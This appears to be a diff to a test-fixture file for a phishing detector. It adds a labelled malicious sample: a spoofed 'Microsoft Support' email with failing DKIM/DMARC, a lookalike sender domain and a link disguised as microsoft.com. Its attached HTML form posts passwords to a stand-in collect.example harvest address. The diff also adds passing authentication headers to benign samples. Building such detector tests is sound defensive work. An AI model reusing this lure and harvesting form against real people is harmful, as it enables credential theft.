@@ -134,6 +134,52 @@ Content-Transfer-Encoding: 7bit
 )
 
 
+sample(
+    "malicious",
+    "instructor-demo.eml",
+    """\
+Return-Path: <bounce@mail-secure.example>
+Received: from mail-secure.example (mail-secure.example [198.51.100.23])
+\tby mx.example.com with ESMTP id 4Wq2Yz1234
+\tfor <victim@example.com>; Tue, 12 Aug 2026 09:14:05 +0000
+Authentication-Results: mx.example.com;
+\tspf=pass smtp.mailfrom=bounce@mail-secure.example;
+\tdkim=fail header.d=micros0ft-login.example;
+\tdmarc=fail policy.p=none header.from=micros0ft-login.example
+Received-SPF: pass (mail-secure.example: domain of bounce@mail-secure.example designates 198.51.100.23 as permitted sender)
+From: "Microsoft Support" <account@micros0ft-login.example>
+To: victim@example.com
+Reply-To: "Account Recovery" <recovery@mail-secure.example>
+Subject: Action required: your account will be suspended in 24 hours
+Date: Tue, 12 Aug 2026 09:14:02 +0000
+Message-ID: <5f2a9c04-1b77-4a10-9d3e-77bb0c2e1a55@mail-secure.example>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="demo42"
+
+--demo42
+Content-Type: text/html; charset="utf-8"
+
+<html><body>
+<p>Unusual sign-in activity was detected on your Microsoft account.</p>
+<p><a href="http://198.51.100.23/account/verify?id=8831">https://account.microsoft.com/secure</a></p>
+<p><a href="http://go.mail-secure.example/redirect?u=http://collect.example/login">Review activity</a></p>
+</body></html>
+
+--demo42
+Content-Type: text/html; name="invoice.html"
+Content-Disposition: attachment; filename="invoice.html"
+Content-Transfer-Encoding: 7bit
+
+<html><body><form action="http://collect.example/harvest" method="post">
+<input name="password" type="password">
+<input type="submit" value="Verify account">
+</form></body></html>
+
+--demo42--
+""",
+)
+
+
 # ---------------------------------------------------------------------------
 # Benign: the false-positive suite.
 #
@@ -156,6 +202,10 @@ Reply-To: <no-reply@mailprovider.example>
 Subject: This week: five things worth reading
 Date: Mon, 11 Aug 2026 06:30:10 +0000
 Message-ID: <20260811063010.21947@o3.mailprovider.example>
+Authentication-Results: mx.example.com;
+\tspf=pass smtp.mailfrom=bounces+21947-news@bounce.mailprovider.example;
+\tdkim=pass header.d=newsletter.example;
+\tdmarc=pass header.from=newsletter.example
 List-Id: The Weekly Dispatch <dispatch.newsletter.example>
 List-Unsubscribe: <https://newsletter.example/unsubscribe?id=21947>
 Precedence: bulk
@@ -187,6 +237,10 @@ To: buyer@example.com
 Subject: Your order 5512-A has shipped
 Date: Fri, 08 Aug 2026 17:22:38 +0000
 Message-ID: <order-5512-A@shop.example>
+Authentication-Results: mx.example.com;
+\tspf=pass smtp.mailfrom=orders@shop.example;
+\tdkim=pass header.d=shop.example;
+\tdmarc=pass header.from=shop.example
 MIME-Version: 1.0
 Content-Type: text/plain; charset="utf-8"
 
@@ -212,6 +266,10 @@ To: "Bob Ellis" <bob@corp.example>
 Subject: Notes from yesterday's planning session
 Date: Thu, 07 Aug 2026 08:04:58 +0000
 Message-ID: <CAF9x2mQ7pL@mail.corp.example>
+Authentication-Results: mail.corp.example;
+\tspf=pass smtp.mailfrom=alice@corp.example;
+\tdkim=pass header.d=corp.example;
+\tdmarc=pass header.from=corp.example
 MIME-Version: 1.0
 Content-Type: text/plain; charset="utf-8"
 
